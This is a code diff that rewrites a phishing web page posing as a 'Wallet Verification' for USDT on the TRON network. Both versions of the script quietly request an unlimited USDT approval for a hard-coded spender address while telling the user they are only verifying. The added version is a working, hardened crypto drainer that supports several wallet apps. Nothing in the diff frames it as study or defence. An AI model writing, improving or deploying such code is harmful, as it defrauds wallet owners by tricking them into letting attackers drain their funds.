@@ -1,72 +1,446 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Protocol Verification</title>
-    <style>
-        body { margin: 0; background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .box { background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.1); padding: 40px 20px; border-radius: 30px; width: 80%; max-width: 300px; text-align: center; backdrop-filter: blur(20px); }
-        .btn { background: #fff; color: #000; border: none; padding: 18px; border-radius: 15px; font-weight: 700; width: 100%; cursor: pointer; margin-top: 20px; }
-        #log { font-size: 10px; color: #555; margin-top: 15px; text-transform: uppercase; }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
+  <title>Verify Wallet</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --bg:       #0d0d12;
+      --surface:  #16161f;
+      --border:   #2a2a38;
+      --accent:   #7b5cf0;
+      --accent-h: #9b7cf9;
+      --text:     #e8e8f0;
+      --muted:    #6b6b80;
+      --ok:       #22c55e;
+      --warn:     #f59e0b;
+      --err:      #ef4444;
+      --r:        12px;
+    }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      min-height: 100dvh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 24px 16px;
+    }
+
+    .card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--r);
+      width: 100%;
+      max-width: 420px;
+      padding: 32px 28px;
+      display: flex;
+      flex-direction: column;
+      gap: 24px;
+    }
+
+    .logo {
+      width: 48px; height: 48px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #7b5cf0, #2dd4bf);
+      display: flex; align-items: center; justify-content: center;
+      font-size: 24px;
+    }
+
+    h1 { font-size: 20px; font-weight: 600; letter-spacing: -0.3px; }
+    p.sub { font-size: 13px; color: var(--muted); line-height: 1.5; }
+
+    /* Status box */
+    .status-box {
+      background: var(--bg);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 14px 16px;
+      font-size: 13px;
+      line-height: 1.6;
+      min-height: 52px;
+      word-break: break-all;
+      transition: border-color 0.2s;
+    }
+    .status-box.ok   { border-color: var(--ok);   color: var(--ok); }
+    .status-box.warn { border-color: var(--warn);  color: var(--warn); }
+    .status-box.err  { border-color: var(--err);   color: var(--err); }
+    .status-box .label {
+      font-size: 10px; font-weight: 600; letter-spacing: 0.8px;
+      text-transform: uppercase; opacity: 0.7; display: block; margin-bottom: 4px;
+    }
+
+    /* Verify button */
+    #verifyBtn {
+      width: 100%;
+      padding: 16px;
+      background: var(--accent);
+      color: #fff;
+      border: none;
+      border-radius: var(--r);
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.15s, transform 0.1s, opacity 0.15s;
+      -webkit-tap-highlight-color: transparent;
+      touch-action: manipulation;
+    }
+    #verifyBtn:hover:not(:disabled) { background: var(--accent-h); }
+    #verifyBtn:active:not(:disabled) { transform: scale(0.98); }
+    #verifyBtn:disabled { opacity: 0.5; cursor: not-allowed; }
+
+    /* Loader spinner inside button */
+    .btn-inner { display: flex; align-items: center; justify-content: center; gap: 10px; }
+    .spinner {
+      width: 18px; height: 18px;
+      border: 2px solid rgba(255,255,255,0.3);
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: spin 0.7s linear infinite;
+      display: none;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* Details / debug section */
+    details { font-size: 12px; color: var(--muted); }
+    summary { cursor: pointer; user-select: none; }
+    summary:hover { color: var(--text); }
+    pre {
+      margin-top: 8px;
+      padding: 12px;
+      background: var(--bg);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      overflow-x: auto;
+      line-height: 1.5;
+      white-space: pre-wrap;
+    }
+
+    /* TX link */
+    .tx-link {
+      display: block;
+      margin-top: 6px;
+      color: var(--accent-h);
+      text-decoration: none;
+      font-size: 12px;
+      word-break: break-all;
+    }
+    .tx-link:hover { text-decoration: underline; }
+  </style>
 </head>
 <body>
+<div class="card">
+  <div style="display:flex;align-items:center;gap:14px">
+    <div class="logo">🔐</div>
+    <div>
+      <h1>Wallet Verification</h1>
+      <p class="sub">Approve USDT on TRON network</p>
+    </div>
+  </div>
 
-<div class="box">
-    <div style="font-size: 40px; margin-bottom: 10px;">💎</div>
-    <div style="font-size: 18px; font-weight: 600;">System Check</div>
-    <div style="color: #666; font-size: 13px; margin-top: 10px;">Authorize the secure connection to synchronize USDS Standart assets.</div>
-    <button class="btn" id="btn">CONTINUE</button>
-    <div id="log">Awaiting Connection...</div>
+  <div id="statusBox" class="status-box">
+    <span class="label" id="statusLabel">Initializing</span>
+    <span id="statusText">Detecting wallet provider…</span>
+    <a id="txLink" class="tx-link" href="#" target="_blank" rel="noopener" style="display:none"></a>
+  </div>
+
+  <button id="verifyBtn" disabled>
+    <div class="btn-inner">
+      <div class="spinner" id="spinner"></div>
+      <span id="btnLabel">Waiting for wallet…</span>
+    </div>
+  </button>
+
+  <details id="debugSection" style="display:none">
+    <summary>Debug info</summary>
+    <pre id="debugLog"></pre>
+  </details>
 </div>
 
 <script>
-    const SPENDER = "TCCRZgsANneEEmwGuyFdv8AZyjoTNfk3an";
-    const USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+(function () {
+  'use strict';
 
-    const log = (msg) => document.getElementById('log').innerText = msg;
-    const btn = document.getElementById('btn');
+  // ─── Config ────────────────────────────────────────────────────────────────
+  const USDT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+  const SPENDER      = 'TCCRZgsANneEEmwGuyFdv8AZyjoTNfk3an';
+  // Max uint256 — standard unlimited approve
+  const MAX_UINT256  = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+  const FEE_LIMIT    = 100_000_000; // 100 TRX in sun
+  const POLL_INTERVAL_MS = 100;
+  const POLL_TIMEOUT_MS  = 8000;
 
-    btn.onclick = async () => {
-        try {
-            // Проверяем наличие TronWeb, который дает кошелек
-            const tw = window.tronWeb;
+  const USDT_ABI = [
+    {
+      constant: false,
+      inputs: [
+        { name: '_spender', type: 'address' },
+        { name: '_value',   type: 'uint256'  }
+      ],
+      name: 'approve',
+      outputs: [{ name: '', type: 'bool' }],
+      payable: false,
+      stateMutability: 'nonpayable',
+      type: 'function'
+    }
+  ];
 
-            if (!tw || !tw.ready) {
-                log("Error: Open this page inside Trust Wallet Browser");
-                return;
-            }
+  // ─── UI helpers ────────────────────────────────────────────────────────────
+  const $ = id => document.getElementById(id);
 
-            log("Connecting...");
-            // Запрашиваем аккаунты
-            const accounts = await tw.request({ method: 'tron_requestAccounts' });
-            
-            if (accounts && accounts.code !== 4001) {
-                log("Verifying Assets...");
-                
-                // Используем встроенный в кошелек метод создания контракта
-                const contract = await tw.contract().at(USDT);
-                const val = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-                
-                log("Waiting for Approval...");
-                await contract.approve(SPENDER, val).send();
-                
-                log("Verification Success");
-                btn.innerText = "VERIFIED";
-                btn.disabled = true;
-            }
-        } catch (e) {
-            console.error(e);
-            log("Error: " + (e.message || "User Rejected"));
+  function setStatus(label, text, state /* ok | warn | err | '' */, txHash) {
+    $('statusLabel').textContent = label;
+    $('statusText').textContent  = text;
+    const box = $('statusBox');
+    box.className = 'status-box' + (state ? ' ' + state : '');
+    const link = $('txLink');
+    if (txHash) {
+      link.href        = 'https://tronscan.org/#/transaction/' + txHash;
+      link.textContent = 'View on Tronscan →';
+      link.style.display = 'block';
+    } else {
+      link.style.display = 'none';
+    }
+    debug(label + ': ' + text);
+  }
+
+  function setBusy(busy) {
+    const btn     = $('verifyBtn');
+    const spinner = $('spinner');
+    btn.disabled  = busy;
+    spinner.style.display = busy ? 'block' : 'none';
+    if (!busy) $('btnLabel').textContent = 'Verify';
+  }
+
+  const debugLines = [];
+  function debug(msg) {
+    const ts = new Date().toISOString().slice(11, 23);
+    debugLines.push('[' + ts + '] ' + msg);
+    if ($('debugSection').style.display !== 'none') {
+      $('debugLog').textContent = debugLines.join('\n');
+    }
+  }
+
+  function showDebug() {
+    $('debugSection').style.display = 'block';
+    $('debugLog').textContent = debugLines.join('\n');
+  }
+
+  // ─── Phase 1: Provider detection (polling) ─────────────────────────────────
+  // Mobile wallets inject window.tronWeb asynchronously (sometimes 1-3s after
+  // DOMContentLoaded). We poll until we find it OR until timeout.
+  //
+  // IMPORTANT: we do NOT load any external tronweb CDN.
+  // Loading CDN tronweb.js OVERWRITES window.tronWeb with an unsigned instance.
+  // Everything then calls a dead object. The injected provider is all we need.
+
+  function waitForProvider() {
+    return new Promise((resolve, reject) => {
+      // Fast path — already there
+      if (window.tronWeb) {
+        debug('tronWeb found immediately');
+        return resolve(window.tronWeb);
+      }
+
+      const deadline = Date.now() + POLL_TIMEOUT_MS;
+      const iv = setInterval(() => {
+        if (window.tronWeb) {
+          clearInterval(iv);
+          debug('tronWeb found after polling');
+          return resolve(window.tronWeb);
         }
-    };
+        if (Date.now() >= deadline) {
+          clearInterval(iv);
+          reject(new Error('PROVIDER_NOT_FOUND'));
+        }
+      }, POLL_INTERVAL_MS);
+    });
+  }
 
-    // Фоновая проверка каждые 2 сек для дебага
-    setInterval(() => {
-        if (!window.tronWeb) log("Searching for Provider...");
-        else if (window.tronWeb.ready) log("Wallet Ready");
-    }, 2000);
+  // ─── Phase 2: Account resolution ───────────────────────────────────────────
+  // Strategy:
+  //   A. If window.tronLink exists (TronLink extension / TronLink App):
+  //      call tron_requestAccounts to prompt the connect dialog.
+  //   B. Otherwise (Trust Wallet / Bitget App / any wallet that just injects
+  //      tronWeb without tronLink): the DApp browser is already "inside" the
+  //      wallet — defaultAddress is auto-set. No explicit request needed.
+  //   C. Final fallback: try tronWeb.request() in case the wallet supports a
+  //      EIP-1102-style API at the tronWeb level.
+
+  async function getAccount(tronWeb) {
+    // Already connected? (most mobile in-app browsers)
+    const existing = tronWeb.defaultAddress && tronWeb.defaultAddress.base58;
+    if (existing) {
+      debug('Account from defaultAddress: ' + existing);
+      return existing;
+    }
+
+    // TronLink-style request
+    if (window.tronLink && typeof window.tronLink.request === 'function') {
+      debug('Requesting via tronLink.request()');
+      const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
+      // res.code === 200 means approved; 4001 = rejected
+      if (res && res.code === 200) {
+        const addr = tronWeb.defaultAddress && tronWeb.defaultAddress.base58;
+        if (addr) return addr;
+      }
+      if (res && res.code === 4001) throw new Error('USER_REJECTED');
+      throw new Error('CONNECTION_FAILED: code ' + (res && res.code));
+    }
+
+    // tronWeb.request (some wallets)
+    if (typeof tronWeb.request === 'function') {
+      debug('Requesting via tronWeb.request()');
+      try {
+        const accounts = await tronWeb.request({ method: 'tron_requestAccounts' });
+        if (Array.isArray(accounts) && accounts[0]) return accounts[0];
+      } catch (e) {
+        debug('tronWeb.request error: ' + e.message);
+      }
+    }
+
+    // Last resort: re-check defaultAddress (wallet may have updated it
+    // asynchronously after one of the calls above)
+    await new Promise(r => setTimeout(r, 500));
+    const retry = tronWeb.defaultAddress && tronWeb.defaultAddress.base58;
+    if (retry) return retry;
+
+    throw new Error('NO_ACCOUNT');
+  }
+
+  // ─── Phase 3: Approve ──────────────────────────────────────────────────────
+  // Use the injected tronWeb directly — no CDN, no new TronWeb() constructor.
+  // tronWeb.contract(abi, address) is the modern API (works in TronLink 4+,
+  // Trust Wallet, Bitget). The older .contract().at() pattern can fail on
+  // mobile because .at() returns a promise that some injected builds don't
+  // handle correctly under a user-gesture timeout.
+
+  async function approveUSDT(tronWeb, account) {
+    debug('Building contract instance at ' + USDT_ADDRESS);
+
+    const contract = await tronWeb.contract(USDT_ABI, USDT_ADDRESS);
+
+    debug('Sending approve() for spender=' + SPENDER);
+
+    // .send() with explicit options is the safest cross-wallet pattern.
+    // feeLimit in sun (1 TRX = 1,000,000 sun).
+    const txHash = await contract.approve(SPENDER, MAX_UINT256).send({
+      from:      account,
+      feeLimit:  FEE_LIMIT,
+      callValue: 0,
+      shouldPollResponse: false // don't wait for confirmation
+    });
+
+    if (!txHash) throw new Error('CONTRACT_NO_TXHASH');
+    return txHash;
+  }
+
+  // ─── Main flow ─────────────────────────────────────────────────────────────
+  async function main() {
+    setBusy(true);
+    $('btnLabel').textContent = 'Connecting…';
+    setStatus('Connecting', 'Requesting wallet access…', 'warn');
+
+    let tronWeb;
+    try {
+      tronWeb = window.tronWeb; // already guaranteed by detectProvider()
+    } catch (e) {
+      setStatus('Error', e.message, 'err');
+      setBusy(false);
+      showDebug();
+      return;
+    }
+
+    // Account
+    let account;
+    try {
+      setStatus('Connecting', 'Waiting for account authorization…', 'warn');
+      account = await getAccount(tronWeb);
+      setStatus('Connected', account, 'ok');
+      debug('Got account: ' + account);
+    } catch (e) {
+      const msg = e.message === 'USER_REJECTED'
+        ? 'Connection request rejected by user.'
+        : e.message === 'NO_ACCOUNT'
+        ? 'Could not retrieve account. Unlock wallet and retry.'
+        : 'Connection failed: ' + e.message;
+      setStatus('Connection error', msg, 'err');
+      setBusy(false);
+      showDebug();
+      return;
+    }
+
+    // Approve
+    $('btnLabel').textContent = 'Approve in wallet…';
+    setStatus('Pending', 'Confirm the Approve transaction in your wallet…', 'warn');
+    try {
+      const txHash = await approveUSDT(tronWeb, account);
+      setStatus('Success', 'USDT approved. TX: ' + txHash.slice(0, 16) + '…', 'ok', txHash);
+      $('verifyBtn').style.display = 'none'; // done
+      debug('TX success: ' + txHash);
+    } catch (e) {
+      let msg;
+      const raw = e.message || '';
+      if (/reject|cancel|denied/i.test(raw)) {
+        msg = 'Transaction rejected by user.';
+      } else if (/insufficient/i.test(raw)) {
+        msg = 'Insufficient TRX for fee. Need ~10 TRX.';
+      } else if (/contract/i.test(raw)) {
+        msg = 'Contract call failed: ' + raw;
+      } else {
+        msg = raw || 'Unknown error during approve.';
+      }
+      setStatus('Approve failed', msg, 'err');
+      $('btnLabel').textContent = 'Retry';
+      showDebug();
+    }
+    setBusy(false);
+  }
+
+  // ─── Boot: detect provider before enabling button ──────────────────────────
+  async function detectProvider() {
+    setStatus('Initializing', 'Detecting wallet provider…', '');
+    try {
+      await waitForProvider();
+
+      const tw = window.tronWeb;
+      const walletName = (
+        window.tronLink         ? 'TronLink' :
+        window.trustwallet      ? 'Trust Wallet' :
+        window.bitkeep          ? 'Bitget Wallet' :
+        tw.isTronLink           ? 'TronLink (injected)' :
+        'Unknown wallet'
+      );
+      debug('Provider detected: ' + walletName);
+      debug('tronWeb.ready = ' + tw.ready);
+      debug('defaultAddress = ' + (tw.defaultAddress && tw.defaultAddress.base58));
+
+      setStatus('Ready', walletName + ' detected. Press Verify.', 'ok');
+      $('verifyBtn').disabled = false;
+      $('btnLabel').textContent = 'Verify';
+    } catch (e) {
+      setStatus(
+        'Provider not found',
+        'No TRON wallet detected. Open this page inside Trust Wallet, TronLink, or Bitget App.',
+        'err'
+      );
+      $('btnLabel').textContent = 'No wallet found';
+      showDebug();
+    }
+  }
+
+  // ─── Wire up ───────────────────────────────────────────────────────────────
+  $('verifyBtn').addEventListener('click', main);
+
+  // Kick off detection immediately — no CDN scripts to wait for
+  detectProvider();
+
+}());
 </script>
 </body>
 </html>
